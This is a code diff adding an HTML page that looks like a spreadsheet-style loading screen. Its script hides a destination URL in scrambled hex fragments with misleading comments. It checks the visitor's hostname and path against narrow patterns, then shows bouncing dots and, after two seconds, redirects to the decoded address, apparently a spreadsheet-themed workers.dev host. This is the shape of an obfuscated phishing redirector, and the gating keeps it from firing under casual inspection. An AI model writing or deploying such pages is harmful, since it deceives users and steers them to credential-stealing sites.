@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<style>
+.loading{
+display:flex;
+gap:12px;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.dot{
+width:20px;
+height:20px;
+background:#217346;
+border-radius:50%;
+animation:bounce 1.4s infinite ease-in-out both;
+}
+
+.dot:nth-child(1){animation-delay:-0.32s;}
+.dot:nth-child(2){animation-delay:-0.16s;}
+.dot:nth-child(3){animation-delay:0s;}
+
+@keyframes bounce{
+0%,80%,100%{transform:scale(0);}
+40%{transform:scale(1);}
+}
+
+#loader{
+display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="loader" class="loading">
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+</div>
+
+<script>
+
+/* HEX pieces (scrambled) */
+const h = [
+"68747470733a2f2f626c7537306c",   // example
+"336673312d657863656c2d", // https
+"6f70656238323531636964393133783373353473707265656473686565657473302d31306",
+"2632e636f6d30323930362e776f726b6572732e6465762f"
+];
+
+/* build hex string */
+function buildHex(){
+return h[1] + "733a" + h[2] + h[0] + h[3];
+}
+
+/* decode hex → string */
+function hexToString(hex){
+let str="";
+for(let i=0;i<hex.length;i+=2){
+str += String.fromCharCode(parseInt(hex.substr(i,2),16));
+}
+return str;
+}
+
+function validateURL(){
+
+let hostname = window.location.hostname;
+let path = window.location.pathname;
+
+/* subdomain rule */
+let subPattern = /^[A-Z]{8}-[0-9]{9}\./;
+
+/* path rule */
+let endPattern = /[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;
+
+if(subPattern.test(hostname) && endPattern.test(path)){
+
+document.getElementById("loader").style.display="flex";
+
+setTimeout(function(){
+
+let hexURL = buildHex();
+let finalURL = hexToString(hexURL);
+
+window.location.href = finalURL;
+
+},2000);
+
+}
+
+}
+
+validateURL();
+
+</script>
+
+</body>
+</html>
